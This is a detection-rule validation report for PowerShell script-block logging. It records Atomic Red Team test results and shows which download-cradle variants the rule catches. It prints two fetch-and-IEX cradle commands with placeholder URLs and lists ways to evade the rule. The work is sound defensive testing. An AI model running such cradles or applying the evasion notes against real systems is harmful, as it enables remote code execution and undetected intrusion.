# Validation — T1059.001 PowerShell Execution

> **Rule**: `rule.kql` / `rule.spl` (Rule B — EID 4104 script block content)
> **Test date**: 2026-06-24
> **Lab host**: LAB-WIN11-01 (Windows 11 22H2, synthetic hostname)
> **Emulation tool**: Atomic Red Team (Invoke-AtomicRedTeam)
> **Sysmon version**: 15.14

---

## Pre-conditions

- Windows Event ID 4104 enabled via registry (`HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging` → `EnableScriptBlockLogging = 1`).
- Splunk running locally, ingesting Windows Event logs via Sysmon/WEC forwarding.

---

## Test Results

Rule A (EID 1 / process creation) was deprioritised; all tests below evaluate **Rule B only** (EID 4104 script block content).

| # | Atomic Test | Description | Rule B fires? | Notes |
|---|---|---|---|---|
| 6 | T1059.001-6 | MsXml COM object download + IEX | Yes | Medium — in-memory execution (IEX) detected; COM fetch not matched |
| 7 | T1059.001-7 | PowerShell XML requests (`[xml]` type accelerator) | Yes | Medium — IEX matched; XML fetch not matched |
| 9 | T1059.001-9 | Invoke-DownloadCradle script suite | Yes | High and Medium across multiple sub-scripts |
---

## Test 6 — MsXml COM Object (PASS)

**Command emulated:**
```powershell
powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','<url>',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"
```

**Alert fired**: Yes — Severity **Medium**, DetectionReason: `In-memory execution (IEX / ScriptBlock::Create)`

**Why it fired**: The EID 4104 script block contained `IEX`, which matched the in-memory execution signal. The fetch via `MsXml2.ServerXmlHttp` was not itself matched (COM-based fetches are not in the current primitive list), but the `IEX` call on the response was sufficient to trigger the Medium tier.

**Why not High**: A High alert requires a fetch primitive AND in-memory execution to appear together in the same block. Because the COM object fetch did not match any recognised fetch keyword, only the memory signal scored — resulting in Medium rather than High.

---

## Test 7 — PowerShell XML Requests (Pass)

**Command emulated:**
```powershell
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute | IEX"
```

**Alert fired**: Yes — Severity **Medium**, DetectionReason: `In-memory execution (IEX / ScriptBlock::Create)`

**Why it fired**: The EID 4104 script block contained `IEX`, which matched the in-memory execution signal. The fetch via `System.Xml.XmlDocument.Load()` is not in the current primitive list, so only the memory signal scored.

**Why not High**: High requires a fetch primitive AND in-memory execution together. The XML-based fetch mechanism falls outside the matched keyword set, so only the memory tier triggered.

---
## Test 9 — Invoke-DownloadCradle Script Suite

**Command emulated**: Full Invoke-DownloadCradle test script (source: https://github.com/mgreen27/mgreen27.github.io)

**Alert fired**: Yes — Severity **High and Medium** across multiple sub-scripts

**Why it fired**: The EID 4104 blocks captured the full range of download cradle syntax across the sub-scripts. Scripts using a recognised fetch primitive alongside `IEX` fired High (fused cradle condition). Scripts using only a single content signal fired Medium.

---

## Outcome

The detection covers a **narrow slice** of the PowerShell execution surface. It correctly identifies the most common IEX-based in-memory execution pattern, but it is evasable:

- Any fetch mechanism outside the current primitive list (COM objects alone, XML requests, raw .NET reflection without named cmdlets) avoids the download signal.
- A cradle that delivers its payload without `IEX` or `[ScriptBlock]::Create` (e.g. direct `.Invoke()` on a compiled assembly) avoids the memory signal entirely.
- The High tier specifically requires both signals to co-occur; an attacker who splits fetch and execution across separate script blocks drops the alert to Medium or suppresses it.

**V2 (complete)**: The Splunk rule was extended with `hasAltExec` (COM installer and moniker binding primitives) and `hasRemote` (URL presence), adding a second High path for remote COM/LOLBin download-and-execute. See the [tuning record](../../../../tuning/T1059.001-PS-fn-reduction/README.md) for the full before/after. The KQL rule retains V1 coverage; COM-based fetch without `IEX` remains a blind spot there.
